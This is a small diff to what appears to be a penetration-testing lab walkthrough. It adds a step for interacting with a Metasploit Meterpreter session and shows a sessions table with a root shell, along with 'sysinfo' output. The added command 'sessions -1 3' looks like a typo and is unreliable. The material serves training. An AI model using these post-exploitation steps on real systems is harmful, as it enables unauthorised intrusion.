@@ -643,6 +643,7 @@ Active sessions
   2         shell x64/linux                                                                            10.114.209.151:4445 -> 10.114.209.148:50665 (192.168.20.100)
   3         meterpreter x86/linux  no-user @ fd5e509d541b (uid=0, gid=0, euid=0, egid=0) @ 172.19.0.2  10.114.209.151:8081 -> 10.114.209.148:59526 (172.19.0.2)
 ```
+   * Type **sessions -1 3** to interact with the newly established **Meterpreter** session
 
 ```console
 meterpreter > sysinfo
@@ -650,7 +651,7 @@ Computer    : 273e1700c5be
 OS          : Linux 273e1700c5be 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
 Meterpreter : php/linux
 meterpreter > ?
-
+```
 
 
 
